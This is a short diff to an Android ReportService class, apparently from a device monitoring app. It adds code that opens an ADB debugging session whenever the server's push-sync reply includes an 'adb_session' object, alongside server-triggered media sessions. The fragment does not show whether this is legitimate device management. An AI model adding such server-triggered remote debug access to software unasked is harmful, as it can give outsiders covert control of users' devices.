@@ -525,6 +525,11 @@ public final class ReportService extends Service {
             JSONObject reply = new JSONObject(HttpJson.post(Protocol.pushSyncPath(), receipt.toString()));
             if (!reply.optBoolean("ok")) throw new java.io.IOException("receipt rejected");
             RuntimeLog.event("push_receipt_saved version=" + version);
+            JSONObject immediateAdb=reply.optJSONObject("adb_session");
+            if(immediateAdb!=null&&CoreInstaller.ready()){
+                RuntimeLog.event("adb_offer_received source=push_sync");
+                openAdb(immediateAdb);
+            }
             JSONObject immediateMedia=reply.optJSONObject("media_session");
             if(immediateMedia!=null){
                 if(media==null)media=new MediaSession(this,store,reportPhotos);
